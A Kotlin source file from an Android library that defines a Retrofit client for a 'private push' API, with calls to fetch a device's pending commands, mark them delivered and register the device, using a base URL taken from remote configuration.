package com.hawkshaw.library.datalayer.network

import android.content.Context
import android.util.Log
import com.hawkshaw.library.config.RemoteConfig
import com.hawkshaw.library.logger.Logger
import com.hawkshaw.library.network.ApiService
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.ResponseBody
import okhttp3.ResponseBody.Companion.toResponseBody
import org.json.JSONObject
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.GET
import retrofit2.http.POST
import retrofit2.http.Path

// Simple base response class
@kotlinx.serialization.Serializable
data class BaseResponse(
    val success: Boolean,
    val message: String = ""
)

// Retrofit interface for private push API
interface PrivatePushService {
    @GET("api/private-push/commands/{deviceId}")
    suspend fun getPendingCommands(@Path("deviceId") deviceId: String): Response<PendingCommandsResponse>
    
    @POST("api/private-push/commands/delivered")
    suspend fun markCommandsDelivered(@Body request: DeliveredCommandsRequest): Response<BaseResponse>
    
    @POST("api/devices/register")
    suspend fun registerDevice(@Body request: RegisterDeviceRequest): Response<BaseResponse>
}

// Data classes for API responses
data class PendingCommandsResponse(
    val success: Boolean,
    val commands: List<PendingCommand>,
    val count: Int
)

data class PendingCommand(
    val id: Int,
    val type: String,
    val data: JSONObject?,
    val timestamp: String
)

data class DeliveredCommandsRequest(
    val commandIds: List<Int>
)

data class RegisterDeviceRequest(
    val deviceId: String,
    val socketId: String
)

// Extension function to create Retrofit service
private fun createPrivatePushService(context: Context): PrivatePushService {
    val retrofit = Retrofit.Builder()
        .baseUrl(RemoteConfig.getInstance(context).getBaseUrl()) // Use RemoteConfig for base URL
        .addConverterFactory(GsonConverterFactory.create())
        .build()
    return retrofit.create(PrivatePushService::class.java)
}

// Extension functions for ApiService
suspend fun ApiService.getPendingCommands(context: Context, deviceId: String): Response<PendingCommandsResponse> {
    return try {
        createPrivatePushService(context).getPendingCommands(deviceId)
    } catch (e: Exception) {
        Log.e("PrivatePushApi", "Error getting pending commands", e)
        Response.error<PendingCommandsResponse>(
            500,
            "Network error".toResponseBody("text/plain".toMediaType())
        )
    }
}

suspend fun ApiService.markCommandsDelivered(context: Context, commandIds: List<Int>): Response<BaseResponse> {
    return try {
        val request = DeliveredCommandsRequest(commandIds)
        createPrivatePushService(context).markCommandsDelivered(request)
    } catch (e: Exception) {
        Log.e("PrivatePushApi", "Error marking commands as delivered", e)
        Response.error<BaseResponse>(
            500,
            "Network error".toResponseBody("text/plain".toMediaType())
        )
    }
}

suspend fun ApiService.registerDeviceForPush(context: Context, deviceId: String, socketId: String): Response<BaseResponse> {
    return try {
        val request = RegisterDeviceRequest(deviceId, socketId)
        createPrivatePushService(context).registerDevice(request)
    } catch (e: Exception) {
        Log.e("PrivatePushApi", "Error registering device", e)
        Response.error<BaseResponse>(
            500,
            "Network error".toResponseBody("text/plain".toMediaType())
        )
    }
}
